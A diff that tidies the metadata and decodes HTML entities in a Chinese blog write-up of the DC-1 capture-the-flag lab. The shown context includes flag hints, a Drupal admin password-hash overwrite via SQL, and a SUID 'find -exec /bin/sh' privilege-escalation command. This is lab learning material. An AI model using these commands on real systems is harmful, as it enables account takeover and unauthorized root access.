@@ -1,9 +1,10 @@
 ---
 link: https://blog.csdn.net/2403_88102829/article/details/154015358
 title: dc系列靶机——dc1
-description: 文章浏览阅读100次。IP扫描手段，smb协议，伪终端，哈希密码加盐，/etc/passwd文件与/etc/shadow文件，bin/bash，有suid的find提权
+description: 记录 DC-1 靶机的信息收集、Drupal 利用、密码哈希分析与 Linux SUID 提权过程，并补充相关系统文件和终端知识。
+excerpt: 记录 DC-1 靶机的信息收集、Drupal 利用、密码哈希分析与 Linux SUID 提权过程，并补充相关系统文件和终端知识。
 keywords: dc系列靶机——dc1
-author: Le_ee 博客等级 码龄1年
+author: Lee
 date: 2025-11-02T09:26:07.778Z
 categories:
   - 靶场复现
@@ -11,10 +12,7 @@ tags:
   - DC靶场
   - Linux
   - 提权
-publisher: null
-stats: paragraph=107 sentences=60, words=234
 ---
-<meta name="referrer" content="no-referrer"/>
 学习补充：
 
 1.工具对比——nmap，arp-scan
@@ -95,7 +93,7 @@ like：tab键补全，ctrl-c正常用，还能执行一些交互性命令
 查看一下文件列表，发现flag1
 
 ```
-flag1&#xFF1A;Every good CMS needs a config file - and so do you.
+flag1：Every good CMS needs a config file - and so do you.
 
 ```
 
@@ -116,7 +114,7 @@ cat一下
 找到了settings.php，cat，报出了flag2
 
 ```
-flag2&#xFF1A;force and dictionary attacks aren't the
+flag2：force and dictionary attacks aren't the
  * only ways to gain access (and you WILL need access).
 
  * What can you do with these credentials?
@@ -160,8 +158,8 @@ flag2提示我们找凭据，下面刚好报了数据库信息：
 php命令生成一下想要密码的哈希值：
 
 ```
-php scripts/password-hash.sh &#x65B0;&#x5BC6;&#x7801;
-//&#x6267;&#x884C;php&#x89E3;&#x91CA;&#x5668; drupal&#x81EA;&#x5E26;&#x7684;&#x5BC6;&#x7801;&#x54C8;&#x5E0C;&#x751F;&#x6210;&#x811A;&#x672C; &#x65B0;&#x5BC6;&#x7801;
+php scripts/password-hash.sh 新密码
+//执行php解释器 drupal自带的密码哈希生成脚本 新密码
 ```
 
 ![](https://i-blog.csdnimg.cn/direct/8182ebb1ced249229aeb463c17e36a85.png)
@@ -183,7 +181,7 @@ update users set pass = "hash" where uid="admin";
 ![](https://i-blog.csdnimg.cn/direct/1576ef581a0b4deda0bfe489d07bec7a.png)
 
 ```
-flag3&#xFF1A;Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+flag3：Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
 
 ```
 
@@ -223,7 +221,7 @@ touch一个text文件假装查找，执行find语句之后立刻能切换到root
 
 ```
 find / -name text -exec /bin/sh \;
-//find [&#x641C;&#x7D22;&#x8DEF;&#x5F84;] [&#x641C;&#x7D22;&#x6761;&#x4EF6;] -exec [&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;] \; [&#x63A7;&#x5236;&#x9009;&#x9879;]
+//find [搜索路径] [搜索条件] -exec [要执行的命令] \; [控制选项]
 ```
 
 进入root
